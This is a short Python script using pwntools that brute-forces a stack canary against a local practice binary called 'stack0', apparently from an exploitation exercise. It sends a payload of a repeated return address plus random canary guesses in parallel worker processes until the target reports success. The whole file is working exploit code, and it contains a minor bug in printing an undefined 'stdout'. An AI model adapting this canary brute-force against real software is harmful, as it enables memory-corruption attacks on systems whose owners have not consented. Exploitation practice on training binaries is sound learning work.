
# using multiprocessing (module)

import sys, os, multiprocessing
from pwn import *
from random import randint
from time import time
from datetime import timedelta

context(aslr=True)

class Tracker():

    def __init__(self):
        self.counter = 0
        self.period_counter = 0

        self.start_timestamp = time()
        self.latest_timestamp = self.start_timestamp

    def inc_counters(self):
        self.counter += 1
        self.period_counter += 1

    def get_metrics(self):
        now = time()
        speed = self.period_counter / (now - self.latest_timestamp)
        elapsed = timedelta(seconds=now-self.start_timestamp)

        self.latest_timestamp = now
        return {"speed": speed, "elapsed": elapsed}

    def reset_period_counter(self):
        self.period_counter = 0


def set_globals():
    global tracker
    tracker = Tracker()

def bruteforcer(num):
    winner = pack(0x080484cc)
    #canary = pack(randint(0, 16777216) << 8)

    while True:
        canary = pack(randint(0, 16777216) << 8)
        payload = winner*16 + canary + b"LLLL"
    
        p = process("stack0")
        p.sendline(payload)
    
        out = p.recvuntil([b"modified", b"smash"])
        p.kill()
    
        if b"modified" in out:
            print(stdout)
            print("we did it boiz (attempt #%d).." % tracker.counter)
            exit()

        tracker.inc_counters()
    
        if tracker.counter%100 == 0:
            metrics = tracker.get_metrics()
            sys.stderr.write("(#%d) attempts: %d | speed: %dp/s | elapsed: %s\n" % (num, tracker.counter, metrics["speed"], metrics["elapsed"]))
            tracker.reset_period_counter()


if __name__ == "__main__":

    workers = os.cpu_count()
    with multiprocessing.Pool(initializer=set_globals) as pool:
        pool.map(bruteforcer, range(workers))


